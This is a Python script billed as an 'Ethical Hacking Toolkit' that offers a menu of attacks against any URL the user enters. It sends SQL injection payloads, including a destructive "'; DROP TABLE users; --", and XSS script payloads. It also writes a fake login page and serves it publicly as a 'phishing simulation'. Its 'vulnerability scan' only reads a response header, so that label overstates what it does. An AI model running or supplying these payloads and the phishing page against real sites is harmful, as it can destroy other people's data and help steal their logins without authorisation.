import requests
import socket
import time
import subprocess
from tqdm import tqdm
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

def banner():
    print("""
    ███╗   ███╗ █████╗ ██╗   ██╗██╗   ██╗████████╗ ██████╗ 
    ████╗ ████║██╔══██╗██║   ██║██║   ██║╚══██╔══╝██╔═══██╗
    ██╔████╔██║███████║██║   ██║██║   ██║   ██║   ██║   ██║
    ██║╚██╔╝██║██╔══██║██║   ██║██║   ██║   ██║   ██║   ██║
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ 
    MAYUTO - Ethical Hacking Toolkit
    """)

def progress_bar(task_name, total=10):
    print(f"\n[+] {task_name}...")
    for _ in tqdm(range(total), desc="Progress"):
        time.sleep(0.2)

def info_gathering(domain):
    progress_bar("Gathering IP and Domain Information")
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] IP Address: {ip}")
    except socket.gaierror:
        print("[-] Error: Invalid domain or network issue.")

def sql_injection_test(url, payloads):
    progress_bar("Testing for SQL Injection")
    for payload in payloads:
        target = url + payload
        try:
            response = requests.get(target, timeout=5)
            if "SQL syntax" in response.text or "mysql" in response.text.lower():
                print(f"[!] Vulnerability found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing payload {payload}: {e}")

def xss_test(url, payloads):
    progress_bar("Testing for XSS Vulnerabilities")
    for payload in payloads:
        try:
            response = requests.get(url, params={'input': payload}, timeout=5)
            if payload in response.text:
                print(f"[!] XSS vulnerability found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing payload {payload}: {e}")

def vulnerability_scan(url):
    progress_bar("Performing Vulnerability Scan")
    try:
        response = requests.get(url, timeout=5)
        server = response.headers.get("Server", "Unknown")
        print(f"[+] Server: {server}")
        print(f"[+] Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

def ping_target(target):
    progress_bar("Pinging Target")
    try:
        result = subprocess.run(['ping', '-c', '4', target], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"[-] Error: {e}")

def phishing_simulation():
    progress_bar("Setting up Phishing Page")
    try:
        # Define a basic phishing HTML template
        phishing_page = """
        <html>
        <head><title>Login</title></head>
        <body>
            <h2>Login to Your Account</h2>
            <form method="POST" action="#">
                Username: <input type="text" name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </body>
        </html>
        """
        # Save the phishing page as an HTML file
        with open("phishing.html", "w") as f:
            f.write(phishing_page)
        
        print("[+] Phishing page saved as 'phishing.html'")
        print("[+] Starting HTTP server on localhost:8080...")
        
        # Start a simple HTTP server to serve the phishing page
        os.chdir(os.getcwd())  # Change to the current directory
        httpd = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
        print("[*] Phishing page running. Press CTRL+C to stop.")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Stopping the server...")
    except Exception as e:
        print(f"[-] Error setting up phishing page: {e}")

if __name__ == "__main__":
    banner()
    while True:
        print("""
        [1] Information Gathering
        [2] SQL Injection Testing
        [3] XSS Testing
        [4] Vulnerability Scan
        [5] Ping Target
        [6] Phishing Simulation
        [7] Exit
        """)
        choice = input("Select an option: ")
        
        if choice == "1":
            domain = input("Enter the domain (e.g., example.com): ")
            info_gathering(domain)
        elif choice == "2":
            url = input("Enter the URL to test (e.g., http://example.com): ")
            sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users; --"]
            sql_injection_test(url, sql_payloads)
        elif choice == "3":
            url = input("Enter the URL to test (e.g., http://example.com): ")
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
            xss_test(url, xss_payloads)
        elif choice == "4":
            url = input("Enter the URL to scan (e.g., http://example.com): ")
            vulnerability_scan(url)
        elif choice == "5":
            target = input("Enter the domain or IP to ping (e.g., example.com or 192.168.1.1): ")
            ping_target(target)
        elif choice == "6":
            phishing_simulation()
        elif choice == "7":
            print("Exiting...")
            break
        else:
            print("Invalid choice!")